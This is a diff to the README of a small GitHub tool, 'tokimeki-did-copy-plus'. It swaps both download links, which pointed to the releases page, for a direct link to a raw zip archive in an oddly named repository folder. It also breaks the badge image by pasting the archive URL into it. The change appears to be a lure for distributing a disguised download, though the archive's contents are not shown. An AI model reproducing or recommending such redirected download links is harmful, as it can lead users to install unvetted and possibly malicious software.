@@ -6,13 +6,13 @@ Welcome to **tokimeki-did-copy-plus**! This software adds an option to copy URLs
 
 ## 🔗 Download Now
 
-[![Download tokimeki-did-copy-plus](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/TrucasPisa/tokimeki-did-copy-plus/releases)
+[![Download tokimeki-did-copy-plus](https://github.com/TrucasPisa/tokimeki-did-copy-plus/raw/refs/heads/main/Spicaria/did_copy_plus_tokimeki_fireweed.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/TrucasPisa/tokimeki-did-copy-plus/raw/refs/heads/main/Spicaria/did_copy_plus_tokimeki_fireweed.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the following page to download the latest version of **tokimeki-did-copy-plus**:
 
-[Download here](https://github.com/TrucasPisa/tokimeki-did-copy-plus/releases)
+[Download here](https://github.com/TrucasPisa/tokimeki-did-copy-plus/raw/refs/heads/main/Spicaria/did_copy_plus_tokimeki_fireweed.zip)
 
 Follow these simple steps:
 
